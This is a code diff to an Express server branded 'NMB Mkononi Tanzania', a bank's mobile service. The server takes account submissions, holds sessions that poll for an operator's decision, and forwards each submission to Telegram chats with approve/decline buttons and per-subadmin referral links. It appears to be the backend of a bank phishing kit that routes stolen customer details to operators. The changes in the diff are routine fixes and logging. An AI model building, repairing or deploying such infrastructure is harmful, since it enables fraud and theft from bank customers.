@@ -7,17 +7,16 @@ const PORT = process.env.PORT || 10000;
 
 // Telegram Configuration
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const DEFAULT_ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Fallback main admin
+const DEFAULT_ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Store active sessions and permanent subadmin/admin mappings
 const sessions = {}; 
-const adminMappings = {}; // Maps ref/chatId permanently
+const adminMappings = {}; 
 
-// Send message to specific Telegram Chat ID
-async function sendTelegramMessage(chatId, text, replyMarkup) {
+// Send message to specific Telegram Chat ID (Fixed replyMarkup handling)
+async function sendTelegramMessage(chatId, text, replyMarkup = {}) {
     if (!TELEGRAM_BOT_TOKEN) {
         console.error('❌ ERROR: TELEGRAM_BOT_TOKEN is missing!');
         return null;
@@ -29,20 +28,27 @@ async function sendTelegramMessage(chatId, text, replyMarkup) {
 
     try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const payload = {
+            chat_id: chatId,
+            text: text,
+            parse_mode: 'HTML'
+        };
+        
+        if (replyMarkup) {
+            payload.reply_markup = replyMarkup;
+        }
+
         const response = await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: text,
-                parse_mode: 'HTML',
-                reply_markup: replyMarkup
-            })
+            body: JSON.stringify(payload)
         });
 
         const data = await response.json();
         if (!data.ok) {
             console.error(`❌ Telegram API Error [${data.error_code}]:`, data.description);
+        } else {
+            console.log(`✅ Telegram message sent successfully to Chat ID: ${chatId}`);
         }
         return data;
     } catch (err) {
@@ -64,7 +70,7 @@ async function removeInlineKeyboard(chatId, messageId, originalText, statusLabel
                 message_id: messageId,
                 text: `${originalText}\n\n<b>Status: [ ${statusLabel} ]</b>`,
                 parse_mode: 'HTML',
-                reply_markup: { inline_keyboard: [] } // Removes buttons completely (fades away)
+                reply_markup: { inline_keyboard: [] }
             })
         });
         const data = await response.json();
@@ -76,7 +82,6 @@ async function removeInlineKeyboard(chatId, messageId, originalText, statusLabel
     }
 }
 
-// Determine target admin chat based on query reference or fallback
 function getTargetAdminChat(ref) {
     if (ref && adminMappings[ref]) {
         return ref;
@@ -184,7 +189,6 @@ app.post('/api/submit-account', async (req, res) => {
     res.json({ success: true });
 });
 
-// Poll endpoint for client to check admin decision status
 app.get('/api/check-status/:sessionId', (req, res) => {
     const { sessionId } = req.params;
     const session = sessions[sessionId];
@@ -196,10 +200,10 @@ app.get('/api/check-status/:sessionId', (req, res) => {
     res.json({ status: currentStatus });
 });
 
-// Telegram Webhook / Callback handler endpoint
 app.post('/api/telegram-webhook', async (req, res) => {
     try {
         const update = req.body;
+        console.log('📥 Incoming Telegram Webhook Update:', JSON.stringify(update));
 
         // Handle /start command securely to return permanent admin link
         if (update && update.message && update.message.text) {
@@ -208,7 +212,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
             const text = messageObj.text.trim();
             
             if (text.startsWith('/start')) {
-                // Permanently map this chat ID
                 adminMappings[chatId] = {
                     chatId: chatId,
                     username: messageObj.from.username ? `@${messageObj.from.username}` : 'None',
@@ -225,7 +228,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
                                    `• Status: <b>Mapped Permanently</b> ✅\n\n` +
                                    `🔗 <b>Kiungo Chako cha Kudumu (Your Permanent Link):</b>\n${permanentLink}`;
                 
-                await sendTelegramMessage(chatId, welcomeMsg, null);
+                console.log(`🚀 Replying to /start command for Chat ID: ${chatId}`);
+                await sendTelegramMessage(chatId, welcomeMsg, undefined);
                 return res.sendStatus(200);
             }
         }
@@ -275,7 +279,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     if (clientRes) clientRes.json({ success: true, status: 'success' });
                 }
 
-                // FADE BUTTONS AWAY immediately on the clicked message
                 if (session.adminMsgId && query.message) {
                     const originalText = query.message.text || 'NMB Mkononi Submission';
                     const targetChat = session.adminChatId || DEFAULT_ADMIN_CHAT_ID;
@@ -301,4 +304,3 @@ app.post('/api/telegram-webhook', async (req, res) => {
 app.listen(PORT, () => {
     console.log(`NMB Mkononi Tanzania server running on port ${PORT}`);
 });
-                                    
